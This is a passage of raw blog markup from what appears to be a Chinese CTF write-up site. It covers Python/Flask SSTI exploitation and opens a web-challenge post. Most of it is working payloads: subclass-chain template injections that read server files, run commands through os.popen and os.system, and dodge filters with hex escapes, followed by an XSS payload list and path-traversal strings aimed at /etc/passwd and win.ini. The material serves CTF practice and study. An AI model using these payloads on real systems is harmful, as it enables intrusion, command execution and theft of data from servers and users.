<span class="token keyword">print</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>下面是列举出来的python的内建函数及其对应的编号<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.getwindowsversion'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'nt.stat_result'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'nt.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'operator.itemgetter'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'operator.attrgetter'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'operator.methodcaller'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'functools.partial'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'MultibyteCodec'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'MultibyteIncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'MultibyteIncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'MultibyteStreamReader'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'MultibyteStreamWriter'</span><span class="token operator">></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>file的标号为40，所以用下面的payload可以读取文件<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"F:/file.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="2-python3读取文件与命令执行"><a href="#2-python3读取文件与命令执行" class="headerlink" title="2.python3读取文件与命令执行"></a>2.python3读取文件与命令执行</h2><p>这里以一道ctf题目作为实例分析一下。</p><h3 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">177</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'f://file.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('whoami').read()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">169</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>[][“<strong>class</strong>“][“<strong>base</strong>“]<strong>subclasses</strong>()<br>[][“\x5f\x5fclass\x5f\x5f”][“\x5f\x5fbases\x5f\x5f”]\x5f\x5fsubclasses\x5f\x5f()</p><p><code>&#123;&#123;[]["\x5f\x5fclass\x5f\x5f"]&#125;&#125;</code><br><code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]&#125;&#125;</code><br><code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()&#125;&#125;</code><br>此时为<br><code>[].__classes__.__bases__[0].__subclasses__()</code>查看可用子类。</p><p>找到<code>warnings.catch_warnings</code>模块为132号<br><code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[132]&#125;&#125;</code></p><p>然后<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.func_globals.keys()&#125;&#125;</code><br>即<code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[132]["\x5f\x5finit\x5f\x5f"]["func\x5fglobals"]["keys"]()&#125;&#125;</code><br>走到这步不行了，换种方法试一下。</p><p><strong>另一种方法</strong><br>另一种payload<br><pre class="line-numbers language-none"><code class="language-none">().__classes__.__bases__[0].__subclasses__()[80].load_moudle(&quot;os&quot;).system(&quot;ls&quot;)&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[80][&quot;load\x5Fmodule&quot;](&quot;os&quot;)[&quot;system&quot;](&quot;ls&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><blockquote><p>其中[80]指的是<code>_frozen_importlib.BuiltinImporter</code>，太强了。这样我们不会得到输出，但我们可以借助外部VPS，wget一个文件。 然后我们得到app.py，读文件。<br><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[91].get_data(0, &quot;app.py&quot;)&#125;&#125;&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0, &quot;app\x2Epy&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>就可以得到app.py文件内容。反推flag即可。<br>这里得到<code>os.remove(&quot;/app/flag&quot;)</code>，什么？flag文件又给删除了？再次读文件<code>/proc/self/fd/3</code>也不是第一次用到了，换payload得flag<br><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0,&quot;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>91模块是<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code>，里面有读文件的方法<code>get_data(0, &quot;文件名&quot;)</code>，猜测应为这种格式，不是很清楚然后就能读文件了。python太杂了，~呜呜呜~</p></blockquote><p><code>flag&#123;d71e1b5f-c027-47a0-a467-504e83d5d002&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub技能树web</title>
      <link href="2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web/"/>
      <url>2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>~<strong>搞他</strong>~</p><h1 id="1-xss"><a href="#1-xss" class="headerlink" title="1.xss"></a>1.xss</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html">'><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> ='><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>vulnerable<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> %3Cscript%3Ealert('XSS')%3C/script%3E <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> %0a%0a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>\"Vulnerable\"<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>.jsp %22%3cscript%3ealert(%22xss%22)%3c/script%3e %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd %2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini 